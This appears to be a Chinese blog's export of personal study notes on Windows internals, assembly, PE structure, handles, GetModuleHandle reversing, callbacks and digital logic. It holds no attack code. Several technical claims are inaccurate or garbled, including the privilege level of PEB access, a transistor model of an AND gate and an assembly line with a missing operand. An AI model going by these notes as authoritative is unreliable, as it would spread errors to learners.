<p>首先,普通的程序员写的程序代码都是ring3的,如果调用int 80h 之类的指令,则需要陷入ring0,这样就获取了高优先级,如何保证这一高优先级权限在生命周期开始时正确借出,并在结束时正确归还,以及如何借出,如何归还就成为了一个重要问题</p>
<p>首先在保护模式下,所有高权限的,但是允许低权限调用的程序,都有唯一的门</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172101378.png" /></p>
<p>门储存在中断向量表里</p>
<p>中断向量表当中的每一个内存单元储存唯一固定的指针,指向唯一固定的dll</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181049935.png" /></p>
<p>一旦程序需要调用高权限程序,只能通过这唯一固定的门</p>
<p>而且在操作系统底层拒绝了覆写这段区域的行为,换句话来说这些门不可能被违规改造</p>
<p>这样就建立了安全的分发机制</p>
<p>另外,我们实际上在现代的win32汇编程序当中见不到int中断指令,因为所有int指令都有对应的dll封装</p>
<p>至于unix内核笔者目前不清楚为什么int使用如此广泛</p>
<p>至于归还权限,只需要在这些中断处置程序的出口点利用ring0的高权限强行修改DS,CS,SS寄存器的相关内容即可</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>存档</category>
      </categories>
  </entry>
  <entry>
    <title>如何使可以正常运行的PE文件后缀直接改为zip后同时还能正常解压</title>
    <url>/ni-xiang-xiao-yan-jiu/er-jin-zhi-za-wen-5-ru-he-shi-ke-yi-zheng-chang-yun-xing-de-pe-wen-jian-hou-zhui-zhi-jie/</url>
    <content><![CDATA[<p>很早之前奇怪过的一个问题</p>
<p>在52上面下载盗版游戏的时候有时候就会遇到一些炫技的师傅整出这种骚操作</p>
<p>下载下来一个特别大的exe打开之后读条半天,读条结束之后弹框,校验完成,请把后缀直接改成zip解压即可游玩</p>
<p>第一次看见的时候一愣一愣的(一时半会儿找不到示例程序,各位想象一下就行)</p>
<p>其实这个和PE文件有关</p>
<p>PE文件的Overlay段可以塞下任何数据而不会影响主体内容的运行,一般的操作就是往里面塞数据包什么的</p>
<p>我们还可以看一下zip的一个特点</p>
<p>zip文件的构建是基于相对偏移的,而非绝对虚拟内存地址</p>
<p>换句话来说就是文件头可以不位于文件的头部</p>
<p>但我还是很奇怪这个东西该怎么开发比较好,</p>
<p>数据包文件和主体解包程序两个文件拼接在一起</p>
<p>虽然说直接使用C语言的write就行,但是还是感觉应该会有更oop的方式才对,不过目前没找到</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>存档</category>
      </categories>
      <tags>
        <tag>悬而未决</tag>
      </tags>
  </entry>
  <entry>
    <title>lea、内存对齐、小端的一些注意点</title>
    <url>/ni-xiang-xiao-yan-jiu/er-jin-zhi-za-ji-lea-nei-cun-dui-qi-xiao-duan-de-yi-ge-zhu-yi-dian/</url>
    <content><![CDATA[<p>lea eax,[ebx+8]就是将ebx+8这个值直接赋给eax，而不是把ebx+8处的内存地址里的数据赋给eax。<br />
mov eax,[ebx+8]则是把内存地址为ebx+8处的数据赋给eax</p>
<p>内存被CPU读取时以dw为对齐，8的倍数</p>
<p>小端的一个注意点来自于C语言中文网的一个lab的反汇编，誊抄如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void makeArray()</span><br><span class="line">&#123;</span><br><span class="line">    char myString[30];</span><br><span class="line">    for ( int i = 0; i &lt; 30; i++ )</span><br><span class="line">        myString[i] = &#x27;*&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">makeArray PROC</span><br><span class="line">    push ebp</span><br><span class="line">    mov ebp,esp</span><br><span class="line">    sub esp, 32            ;myString 位于 EBP-30 的位置</span><br><span class="line">    lea esi, [ebp-30]      ;加载 myString 的地址</span><br><span class="line">    mov ecx, 30            ;循环计数器</span><br><span class="line">LI: mov BYTE PTR [esi]     ;填充一个位置</span><br><span class="line">    inc esi                ;指向下一个元素</span><br><span class="line">    loop LI                ;循环，直到 ECX=0</span><br><span class="line">    add esp, 32            ;删除数组(恢复ESP)</span><br><span class="line">    pop ebp</span><br><span class="line">    ret</span><br><span class="line">makeArray ENDP</span><br></pre></td></tr></table></figure>
<p>首先，栈增长方向向下，根据小端序，低位数据放在低位，所以str的第一个元素几乎在栈顶，但由于对齐的原因，栈实际增长为32</p>
<p>另外有如下代码的栈空间示例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void foo()&#123;</span><br><span class="line">int a[5];</span><br><span class="line">int b[3];</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181056110.png" /></p>
<p>也就是说，相邻数组下越界发生的时不是读取到了下一个数组的第一个元素，而是下一个数组的最后一个元素</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181055415.png" /></p>
<p>另外IDA这个小端数据显示方式是</p>
<p>54h是最低位的,存在地址低位,也就是左边的起始地址</p>
<p>同时地址最低位存放的是数组角标最小的元素</p>
<p>地址最高位存放的是角标最大的元素</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>存档</category>
      </categories>
  </entry>
  <entry>
    <title>Windows API (1)</title>
    <url>/ni-xiang-xiao-yan-jiu/ju-bing-lei-jia-zu-xiang-jie-bi-ji/</url>
    <content><![CDATA[<p>首先是补一些历史课</p>
<p>在Windows还是一个16位操作系统的年代，句柄和API的思想已经比较成熟了</p>
<p>那时候的内存区块还不是flat mod，所以需要区分指向同一份dll模块的不同指针拷贝，为了这样的需求，微软首次发明了实例的概念，每个拷贝是一个实例，所以句柄实例的类型是hInstance类</p>
<p>后来win32内存变为flat mod，同时保护模式的CPU和一些Windows的安全机制，于是区分拷贝实例也不再必要了，这一时期的句柄相关API使用的是hMoudle类，另外窗体使用的是hWND类，然后又有了通用的HANDLE类</p>
<p>但其实后来微软统一了一下，现在在头文件里面他们是一个东西23333</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef PVOID HANDLE;</span><br><span class="line">typedef HANDLE HWND;</span><br><span class="line">typedef HANDLE HINSTANCE;</span><br><span class="line">typedef HINSTANCE HMODULE;</span><br></pre></td></tr></table></figure>
<p>顺便有点好奇空指针的实际意义，顺着找到了某大神的解答</p>
<p>pVOID，aka "Pointer to something, but it's up to you to figure it out"</p>
<p>简直完美，另外有一段解答</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172113311.png" /></p>
<p>但是因此感觉空指针会危险很多，而且出了bug不好修，自己写些小东西的话还是少用吧</p>
<p>历史课结束</p>
<p>句柄涵盖的范围很广，包括常见的模块，窗体，线程等，也包括静态资源（也很常见，但和其他动态资源比起来，这位有点异端）的临时（程序关闭就结束）全局索引</p>
<p>另外，任何模块的句柄在数值上等于模块装入内存的起始地址，书中原话是“模块句柄在数值上等于程序在内存中装入的起始地址”，应该是作者写错了，已经提交勘误，不过我估计琢石成器这种老书也很难再版了吧。。</p>
<p>句柄的概念更像是一种黑匣子</p>
<p>我们去商场购物，要存东西，存好东西之后，存包机吐出来一个条形码，这里我们假设条形码翻译出来的数字就是句柄，而这个句柄对应的资源就是我们的包</p>
<p>但是我们（作为调用资源的应用程序）并不需要知道这个数字是怎么生成的，只需要把这个句柄作为凭证告知操作系统，操作系统就会返还对应资源（我们存的包）</p>
<p>但实际上真正的句柄也不是一种凭证，句柄的调用是基于flat模式安全性的，不存在越权一说，只需要有一个数字就行，数字本身不具有电子签名能力（但是条形码有凭证签名能力，因为可以默认顾客不会带着打印机来商场伪造条形码）</p>
<p>姑且先写这些，有一些其他细节还在考证（也可能之后就懒得考证了，因为都是一些特别底层的东西，感觉也暂时没必要了解）</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>存档</category>
        <category>开发</category>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>需要修改</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows API (2) 继承句柄</title>
    <url>/ni-xiang-xiao-yan-jiu/ju-bing-xiang-jie-bi-ji-2/</url>
    <content><![CDATA[<p>《琢石成器》里面的"每个模块都有一个惟一的模块句柄来标识。"有一定的迷惑性，我一直以为句柄是全局可继承的，但是实际上不是</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172101812.png" /></p>
<p>根据微软文档第一句话，GetMoudleHandle获取的句柄是基于当前程序的4GB虚拟空间的，并非全局可继承</p>
<p>但是这就引出了另一个奇怪问题，笔者最先误以为句柄是全局，主要原因是进程间通信并不是一个特别难实现的功能（但笔者并未亲自实现过），如果句柄并非全局这样就涉及了一个重要问题：如何继承句柄？</p>
<p>句柄类似于指针，指向文件，模块等内容，方便程序调用，如果需要进程间传递文件指针（文件名操作不一定方便），则需要维护并继承文件句柄，其他模块同理</p>
<p>主要是用SetHandleInformation这个函数,文档很详细,看完基本没有说明疑惑,这里不展开了</p>
<h2 id="补充更新">补充更新</h2>
<p>向非继承窗口发送消息时，先要FindWindow，这个find是根据窗口名称字符串查找的，得到的句柄是局部维护的，并不是目标窗口的全局句柄</p>
<p>实际上，无论如何，句柄根本不是一个全局概念</p>
]]></content>
      <categories>
        <category>信息安全</category>
        <category>开发</category>
        <category>二进制</category>
        <category>Windows</category>
      </categories>
  </entry>
  <entry>
    <title>Windows API (3) GetModuleHandle 逆向</title>
    <url>/ni-xiang-xiao-yan-jiu/ju-bing-xiang-jie-bi-ji-3-windows-xi-tong-api-getmodulehandle-ni-xiang-bi-ji/</url>
    <content><![CDATA[<p>示例代码如下(C++),有一些无效的内容,比如string什么的,无视即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;windows.h&gt;</span><br><span class="line">#include&lt;winternl.h&gt;</span><br><span class="line">#include&lt;string&gt;</span><br><span class="line">#include&lt;libloaderapi.h&gt;</span><br><span class="line">#include&lt;winuser.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">HANDLE a = GetModuleHandleA(NULL);</span><br><span class="line">cout &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里需要关闭随机基址</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172101111.png" /></p>
<p>编译出来之后x86dbg打开,用API断点插件(https://www.52pojie.cn/thread-1384349-1-1.html)直接断在GetModuleHandle</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172101122.png" /></p>
<p>跟跳</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172101521.png" /></p>
<p>第一句是mov edi,edi，查了一下知识点比较多，之后单独开一篇</p>
<p>push保存现场</p>
<p>获取参数1(参数1是module名,这里是NULL表示exe程序自身)</p>
<p>sub扩展局部空间</p>
<p>test重置flag</p>
<p>je跟跳</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172101252.png" /></p>
<p>出乎笔者意料之外，核心内容只有两行</p>
<p>查fs表30偏移</p>
<p>ring0下偏移30存放的指向是PEB的指针</p>
<p>peb+8偏移是ImageBaseAddress，也就是基址</p>
<p>返回eax</p>
<p>至于什么是PEB我觉得可以单开一篇文章，因为网上能找到的讲PEB的文章实在是太少了</p>
<p>能查到的文章基本全是一模一样的互相抄，找了半天最初来源居然是夜影爷爷写的23333，有点戏剧性</p>
]]></content>
      <categories>
        <category>信息安全</category>
        <category>开发</category>
        <category>二进制</category>
        <category>Windows</category>
      </categories>
  </entry>
  <entry>
    <title>回调函数和匿名回调法</title>
    <url>/ni-xiang-xiao-yan-jiu/hui-diao-han-shu/</url>
    <content><![CDATA[<p>之前在Unity开发的时候遇到一个现象：同样是unity对外暴露的接口函数，同样都是程序自身完全没有调用过（但都是unity会调用的）但是rider对其语法高亮却不同，这主要是回调函数和普通函数的区别</p>
<p>回调函数应当理解为委托与委托的回收，当然也可以单纯理解为提前声明但是没有定义，或者没有完整定义的函数</p>
<p>不过前者是底层本质</p>
<p>更深层的说，比如微软已经基本写好一个函数，这个函数一般是作为某类委托的回调函数的主调</p>
<p>但是这个函数并不是完整定义的，因为微软并不知道你需要如何处理委托，比如打印字符，微软并不知道你想如何打印（实际上printf之类的函数并不是回调函数，举个例子而已），于是微软只会放一个打印接口，然后让程序员自己补全里面的细节内容，但并不是让程序员直接补全，因为直接补全意味着修改系统文件，是高危行为，实际上的补全方法是利用回调函数的入口点地址传参进去（参数名adr）</p>
<p>然后call <span class="citation" data-cites="adr即可">@adr即可</span>，这样就从控制权就从系统函数移交到用户函数，ring0变ring3，风险性降低</p>
<p>这个补全的过程称为<strong>登记</strong></p>
<p>“回”这个字来自于从ring0<strong>返回</strong>ring3的过程</p>
<p>unity底层代码看不懂，这里找了个python的例子</p>
<p>假设我们现在由于某密码算法需求，需要各种同余群，比如2k＋1，4k＋1，6k＋1，8k＋1...</p>
<p>但是我们需要的<strong>种类</strong>是无限的，因此，传统写法无法满足需求：if，switch不能无限，而且传统写法也需要声明无数个函数，如果用<strong>回调＋匿名递归</strong>则可以非常漂亮的完成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#OddNumGroupGenerator.py</span><br><span class="line">def getOddNumber(k, getEvenNumber):</span><br><span class="line">    return 1 + getEvenNumber(k)</span><br><span class="line"></span><br><span class="line">#main.py</span><br><span class="line">from OddNumGroupGenerator import *</span><br><span class="line">def main():</span><br><span class="line">      i = getOddNumber(k, lambda x: x * 2*n)  #完美</span><br><span class="line">   </span><br></pre></td></tr></table></figure>
<p>n为需要的自然数,如果需要4k＋1群，则2*n=4即n=2,当然也可以控制n的值为偶数(通过偶数生成器的返回值),然后把2*n改为n</p>
<p>另外，窗口的回调函数往往称为窗口过程</p>
]]></content>
      <categories>
        <category>信息安全</category>
        <category>开发</category>
        <category>二进制</category>
        <category>GamePlay</category>
      </categories>
      <tags>
        <tag>回调函数</tag>
      </tags>
  </entry>
  <entry>
    <title>如何数数</title>
    <url>/ni-xiang-xiao-yan-jiu/ru-he-shu-shu/</url>
    <content><![CDATA[<p>刚发现我其实不会数数，虚心钻研，写个小笔记</p>
<h2 id="正文">正文</h2>
<p>例子如图</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172122393.png" /></p>
<p>DOS头</p>
<p>虽然大家心里都清楚,但是等需要在意这一细节时却往往忘记</p>
<p>这一细节便是数据都有宽度，即数据宽度，也就是位宽</p>
<p>假设我们需要从头数一下e_res的偏移</p>
<p>那么我们数出来的结果不能包括 e_res 本身的位宽</p>
<p>如果加上其本身的位宽，那就相当于跨过了整个元素，我们得到的是”尾地址偏移“或者是下一个元素的头偏移</p>
<p>或者可以这么想，<strong>如果要获得某个元素的偏移，那么我们应该累加这个元素前所有元素的位宽（不包含这个元素本身）</strong></p>
]]></content>
      <categories>
        <category>黑历史与垃圾</category>
      </categories>
  </entry>
  <entry>
    <title>如何理解某些位运算</title>
    <url>/ni-xiang-xiao-yan-jiu/ru-he-li-jie-mou-xie-wei-yun-suan/</url>
    <content><![CDATA[<p>与门可以认为是三极管（实际上就是）</p>
<p>输出端是三极管阴极</p>
<p>Vin1是三极管阳极</p>
<p>Vin2是三极管栅极</p>
<p>栅极加个反相器控制放行，True时放行，不拦截，false拦截阳极</p>
<p>异或和同或可以合并记忆</p>
<p>异或是相异放行，同或是相同放行</p>
<p>或可以理解为“或者这样,或者那样”</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>校内</category>
        <category>计组</category>
      </categories>
  </entry>
  <entry>
    <title>如何理解模运算，以及计数器目的</title>
    <url>/ni-xiang-xiao-yan-jiu/ru-he-li-jie-mo-yun-suan-yi-ji-ji-shu-qi-mu-de/</url>
    <content><![CDATA[<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172123683.png" /></p>
<p>计数器统计了经历的时间状态，并非精准计时setup time多少毫秒等，而是记录已经经历了多少CPU时间刻</p>
<p>放大时间范围，从而安全确定时间对应的元件状态，同时也是为了对齐</p>
<p>模其实就是计时器的时间到了哪一个状态</p>
<p>所有状态都走完之后，相当于模整除，进入下一次工作</p>
<p>同时也可以用来实现外频、倍频机制</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172158052.png" /></p>
<p>图为降低频率</p>
<p>有点类似RAM时序和频率</p>
<p>如果强行拉高频率，主控跟不上，则BIOS会自动拉高时序</p>
<p>但是最后还是处理相同数据</p>
<p>之前很奇怪怎么实现的，现在看来好简单2333</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181048400.png" /></p>
<h2 id="异步计数局部计时">异步计数（局部计时）</h2>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172158807.png" /></p>
<p>主要用于确定某一部件运行到了哪一个状态</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>校内</category>
        <category>计组</category>
      </categories>
  </entry>
  <entry>
    <title>跳转表逆向笔记</title>
    <url>/ni-xiang-xiao-yan-jiu/tiao-zhuan-biao-ni-xiang-bi-ji/</url>
    <content><![CDATA[<p>以前看跳转表懵逼的原因姑且找到了</p>
<p>IDA的伪代码看着实在是有点难受(主要是笔者目前对16位汇编语法更熟悉...)</p>
<p>逆跳转表反而是看机器码更容易理解</p>
<p>一句话简述就是</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172059897.png" /></p>
<p>这个表其实就是一个数组</p>
<p>数组头是401168(IDA逆向出来数组所有元素的地址都是数组头的地址),这个算是解释了第一个疑惑点</p>
<p>另一个疑惑点就是为什么有个off_401168 后面又是offset</p>
<p>其实原因一样</p>
<p>这个是个数组,数组名是off_401168,元素全都是偏移(套娃了)</p>
<p>其实看机器码反而更容易理解,这段伪代码的描述有点难受</p>
]]></content>
      <categories>
        <category>信息安全</category>
        <category>二进制</category>
        <category>逆向</category>
      </categories>
  </entry>
</search>
